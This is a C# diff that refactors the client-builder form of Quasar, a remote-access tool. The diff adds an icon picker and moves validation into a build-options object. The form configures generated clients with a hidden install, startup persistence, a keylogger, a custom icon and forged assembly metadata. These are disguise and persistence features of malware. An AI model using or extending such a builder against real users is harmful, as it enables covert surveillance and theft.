@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.ComponentModel;
+using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Windows.Forms;
@@ -40,7 +41,8 @@ namespace xServer.Forms
             chkHide.Checked = profile.HideFile;
             chkStartup.Checked = profile.AddStartup;
             txtRegistryKeyName.Text = profile.RegistryName;
-            chkIconChange.Checked = profile.ChangeIcon;
+            chkChangeIcon.Checked = profile.ChangeIcon;
+            txtIconPath.Text = profile.IconPath;
             chkChangeAsmInfo.Checked = profile.ChangeAsmInfo;
             chkKeylogger.Checked = profile.Keylogger;
             txtProductName.Text = profile.ProductName;
@@ -71,7 +73,8 @@ namespace xServer.Forms
             profile.HideFile = chkHide.Checked;
             profile.AddStartup = chkStartup.Checked;
             profile.RegistryName = txtRegistryKeyName.Text;
-            profile.ChangeIcon = chkIconChange.Checked;
+            profile.ChangeIcon = chkChangeIcon.Checked;
+            profile.IconPath = txtIconPath.Text;
             profile.ChangeAsmInfo = chkChangeAsmInfo.Checked;
             profile.Keylogger = chkKeylogger.Checked;
             profile.ProductName = txtProductName.Text;
@@ -90,9 +93,10 @@ namespace xServer.Forms
 
             txtPort.Text = Settings.ListenPort.ToString();
 
-            UpdateControlStates();
-
-            ToggleAsmInfoControls();
+            UpdateInstallationControlStates();
+            UpdateStartupControlStates();
+            UpdateAssemblyControlStates();
+            UpdateIconControlStates();
         }
 
         private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
@@ -192,69 +196,138 @@ namespace xServer.Forms
         {
             HasChanged();
 
-            UpdateControlStates();
+            UpdateInstallationControlStates();
         }
 
         private void chkStartup_CheckedChanged(object sender, EventArgs e)
         {
             HasChanged();
 
-            txtRegistryKeyName.Enabled = chkStartup.Checked;
+            UpdateStartupControlStates();
         }
 
         private void chkChangeAsmInfo_CheckedChanged(object sender, EventArgs e)
         {
             HasChanged();
 
-            ToggleAsmInfoControls();
+            UpdateAssemblyControlStates();
+        }
+
+        private void btnBrowseIcon_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog ofd = new OpenFileDialog())
+            {
+                ofd.Title = "Choose Icon";
+                ofd.Filter = "Icons *.ico|*.ico";
+                ofd.Multiselect = false;
+                if (ofd.ShowDialog() == DialogResult.OK)
+                {
+                    txtIconPath.Text = ofd.FileName;
+                    iconPreview.Image = Bitmap.FromHicon(new Icon(ofd.FileName, new Size(64, 64)).Handle);
+                }
+            }
+        }
+
+        private void chkChangeIcon_CheckedChanged(object sender, EventArgs e)
+        {
+            HasChanged();
+
+            UpdateIconControlStates();
         }
         #endregion
 
-        private bool CheckInput()
+        private bool CheckForEmptyInput()
         {
-            return (!string.IsNullOrEmpty(txtTag.Text) && !string.IsNullOrEmpty(txtMutex.Text) && // General Settings
-                 _hosts.Count > 0 && !string.IsNullOrEmpty(txtPassword.Text) && !string.IsNullOrEmpty(txtDelay.Text) && // Connection
-                 (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrEmpty(txtInstallname.Text))) && // Installation
-                 (!chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrEmpty(txtRegistryKeyName.Text)))); // Installation
+            return (!string.IsNullOrWhiteSpace(txtTag.Text) && !string.IsNullOrWhiteSpace(txtMutex.Text) && // General Settings
+                 _hosts.Count > 0 && !string.IsNullOrWhiteSpace(txtPassword.Text) && !string.IsNullOrWhiteSpace(txtDelay.Text) && // Connection
+                 (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrWhiteSpace(txtInstallname.Text))) && // Installation
+                 (!chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrWhiteSpace(txtRegistryKeyName.Text)))); // Installation
         }
 
-        private void btnBuild_Click(object sender, EventArgs e)
+        private BuildOptions ValidateInput()
         {
-            if (!CheckInput())
+            BuildOptions options = new BuildOptions();
+            if (!CheckForEmptyInput())
             {
                 MessageBox.Show("Please fill out all required fields!", "Build failed", MessageBoxButtons.OK,
                     MessageBoxIcon.Information);
-                return;
+                return options;
             }
 
-            string output = string.Empty;
-            string icon = string.Empty;
-            string password = txtPassword.Text;
+            options.Tag = txtTag.Text;
+            options.Mutex = txtMutex.Text;
+            options.RawHosts = HostHelper.GetRawHosts(_hosts);
+            options.Password = txtPassword.Text;
+            options.Delay = int.Parse(txtDelay.Text);
+            options.IconPath = txtIconPath.Text;
+            options.Version = Application.ProductVersion;
+            options.InstallPath = GetInstallPath();
+            options.InstallSub = txtInstallsub.Text;
+            options.InstallName = txtInstallname.Text + ".exe";
+            options.StartupName = txtRegistryKeyName.Text;
+            options.Install = chkInstall.Checked;
+            options.Startup = chkStartup.Checked;
+            options.HideFile = chkHide.Checked;
+            options.Keylogger = chkKeylogger.Checked;
 
-            if (password.Length < 3)
+            if (options.Password.Length < 3)
             {
                 MessageBox.Show("Please enter a secure password with more than 3 characters.",
                     "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                return;
+                return options;
             }
 
             if (!File.Exists("client.bin"))
             {
                 MessageBox.Show("Could not locate \"client.bin\" file. It should be in the same directory as Quasar.",
                     "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                return;
+                return options;
             }
 
-            if (chkIconChange.Checked)
+            if (options.RawHosts.Length < 2)
             {
-                using (OpenFileDialog ofd = new OpenFileDialog())
+                MessageBox.Show("Please enter a valid host to connect to.", "Build failed", MessageBoxButtons.OK,
+                    MessageBoxIcon.Error);
+                return options;
+            }
+
+            if (chkChangeIcon.Checked)
+            {
+                if (string.IsNullOrWhiteSpace(options.IconPath) || !File.Exists(options.IconPath))
                 {
-                    ofd.Title = "Choose Icon";
-                    ofd.Filter = "Icons *.ico|*.ico";
-                    ofd.Multiselect = false;
-                    if (ofd.ShowDialog() == DialogResult.OK)
-                        icon = ofd.FileName;
+                    MessageBox.Show("Please choose a valid icon path.", "Build failed", MessageBoxButtons.OK,
+                        MessageBoxIcon.Error);
+                    return options;
                 }
+            }
+            else
+                options.IconPath = string.Empty;
+
+            if (chkChangeAsmInfo.Checked)
+            {
+                if (!FormatHelper.IsValidVersionNumber(txtProductVersion.Text))
+                {
+                    MessageBox.Show("Please enter a valid product version number!\nExample: 1.2.3.4", "Build failed",
+                        MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return options;
+                }
+
+                if (!FormatHelper.IsValidVersionNumber(txtFileVersion.Text))
+                {
+                    MessageBox.Show("Please enter a valid file version number!\nExample: 1.2.3.4", "Build failed",
+                        MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return options;
+                }
+
+                options.AssemblyInformation = new string[8];
+                options.AssemblyInformation[0] = txtProductName.Text;
+                options.AssemblyInformation[1] = txtDescription.Text;
+                options.AssemblyInformation[2] = txtCompanyName.Text;
+                options.AssemblyInformation[3] = txtCopyright.Text;
+                options.AssemblyInformation[4] = txtTrademarks.Text;
+                options.AssemblyInformation[5] = txtOriginalFilename.Text;
+                options.AssemblyInformation[6] = txtProductVersion.Text;
+                options.AssemblyInformation[7] = txtFileVersion.Text;
             }
 
             using (SaveFileDialog sfd = new SaveFileDialog())
@@ -263,58 +336,35 @@ namespace xServer.Forms
                 sfd.Filter = "Executables *.exe|*.exe";
                 sfd.RestoreDirectory = true;
                 sfd.FileName = "Client-built.exe";
-                if (sfd.ShowDialog() != DialogResult.OK) return;
-                output = sfd.FileName;
+                if (sfd.ShowDialog() != DialogResult.OK)
+                {
+                    return options;
+                }
+                options.OutputPath = sfd.FileName;
             }
 
-            if (string.IsNullOrEmpty(output))
+            if (string.IsNullOrEmpty(options.OutputPath))
             {
-                MessageBox.Show("Please choose a valid output path.", "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                return;
+                MessageBox.Show("Please choose a valid output path.", "Build failed", MessageBoxButtons.OK,
+                    MessageBoxIcon.Error);
+                return options;
             }
 
-            if (chkIconChange.Checked && string.IsNullOrEmpty(icon))
-            {
-                MessageBox.Show("Please choose a valid icon path.", "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            options.ValidationSuccess = true;
+            return options;
+        }
+
+        private void btnBuild_Click(object sender, EventArgs e)
+        {
+            BuildOptions options = ValidateInput();
+            if (!options.ValidationSuccess)
                 return;
-            }
 
             try
             {
-                string[] asmInfo = null;
-                if (chkChangeAsmInfo.Checked)
-                {
-                    if (!FormatHelper.IsValidVersionNumber(txtProductVersion.Text))
-                    {
-                        MessageBox.Show("Please enter a valid product version number!\nExample: 1.2.3.4", "Build failed",
-                            MessageBoxButtons.OK, MessageBoxIcon.Error);
-                        return;
-                    }
+                ClientBuilder.Build(options);
 
-                    if (!FormatHelper.IsValidVersionNumber(txtFileVersion.Text))
-                    {
-                        MessageBox.Show("Please enter a valid file version number!\nExample: 1.2.3.4", "Build failed",
-                            MessageBoxButtons.OK, MessageBoxIcon.Error);
-                        return;
-                    }
-
-                    asmInfo = new string[8];
-                    asmInfo[0] = txtProductName.Text;
-                    asmInfo[1] = txtDescription.Text;
-                    asmInfo[2] = txtCompanyName.Text;
-                    asmInfo[3] = txtCopyright.Text;
-                    asmInfo[4] = txtTrademarks.Text;
-                    asmInfo[5] = txtOriginalFilename.Text;
-                    asmInfo[6] = txtProductVersion.Text;
-                    asmInfo[7] = txtFileVersion.Text;
-                }
-
-                ClientBuilder.Build(output, txtTag.Text, HostHelper.GetRawHosts(_hosts), password, txtInstallsub.Text,
-                    txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked,
-                    chkHide.Checked, chkKeylogger.Checked, int.Parse(txtDelay.Text), GetInstallPath(), icon, asmInfo,
-                    Application.ProductVersion);
-
-                MessageBox.Show("Successfully built client!\nSaved to: " + output, "Build Success", MessageBoxButtons.OK,
+                MessageBox.Show("Successfully built client!\nSaved to: " + options.OutputPath, "Build Success", MessageBoxButtons.OK,
                     MessageBoxIcon.Information);
             }
             catch (Exception ex)
@@ -325,7 +375,7 @@ namespace xServer.Forms
             }
         }
 
-        private void RefreshExamplePath()
+        private void RefreshPreviewPath()
         {
             string path = string.Empty;
             if (rbAppdata.Checked)
@@ -348,7 +398,7 @@ namespace xServer.Forms
                                 ? Environment.SpecialFolder.SystemX86
                                 : Environment.SpecialFolder.System), txtInstallsub.Text), txtInstallname.Text);
 
-            this.Invoke((MethodInvoker)delegate { txtExamplePath.Text = path + ".exe"; });
+            this.Invoke((MethodInvoker)delegate { txtPreviewPath.Text = path + ".exe"; });
         }
 
         private short GetInstallPath()
@@ -374,33 +424,30 @@ namespace xServer.Forms
             }
         }
 
-        private void ToggleAsmInfoControls()
+        private void UpdateAssemblyControlStates()
         {
-            this.Invoke((MethodInvoker) delegate
-            {
-                foreach (Control ctrl in assemblyPage.Controls)
-                {
-                    var label = ctrl as Label;
-                    if (label != null)
-                    {
-                        label.Enabled = chkChangeAsmInfo.Checked;
-                        continue;
-                    }
-
-                    var box = ctrl as TextBox;
-                    if (box != null)
-                        box.Enabled = chkChangeAsmInfo.Checked;
-                }
-            });
+            txtProductName.Enabled = chkChangeAsmInfo.Checked;
+            txtDescription.Enabled = chkChangeAsmInfo.Checked;
+            txtCompanyName.Enabled = chkChangeAsmInfo.Checked;
+            txtCopyright.Enabled = chkChangeAsmInfo.Checked;
+            txtTrademarks.Enabled = chkChangeAsmInfo.Checked;
+            txtOriginalFilename.Enabled = chkChangeAsmInfo.Checked;
+            txtFileVersion.Enabled = chkChangeAsmInfo.Checked;
+            txtProductVersion.Enabled = chkChangeAsmInfo.Checked;
         }
 
-        private void HasChanged()
+        private void UpdateIconControlStates()
         {
-            if (!_changed && _profileLoaded)
-                _changed = true;
+            txtIconPath.Enabled = chkChangeIcon.Checked;
+            btnBrowseIcon.Enabled = chkChangeIcon.Checked;
         }
 
-        private void UpdateControlStates()
+        private void UpdateStartupControlStates()
+        {
+            txtRegistryKeyName.Enabled = chkStartup.Checked;
+        }
+
+        private void UpdateInstallationControlStates()
         {
             txtInstallname.Enabled = chkInstall.Checked;
             rbAppdata.Enabled = chkInstall.Checked;
@@ -408,8 +455,12 @@ namespace xServer.Forms
             rbSystem.Enabled = chkInstall.Checked;
             txtInstallsub.Enabled = chkInstall.Checked;
             chkHide.Enabled = chkInstall.Checked;
-            chkStartup.Enabled = chkInstall.Checked;
-            txtRegistryKeyName.Enabled = (chkInstall.Checked && chkStartup.Checked);
+        }
+
+        private void HasChanged()
+        {
+            if (!_changed && _profileLoaded)
+                _changed = true;
         }
 
         /// <summary>
@@ -427,7 +478,7 @@ namespace xServer.Forms
         {
             HasChanged();
 
-            RefreshExamplePath();
+            RefreshPreviewPath();
         }
     }
 }
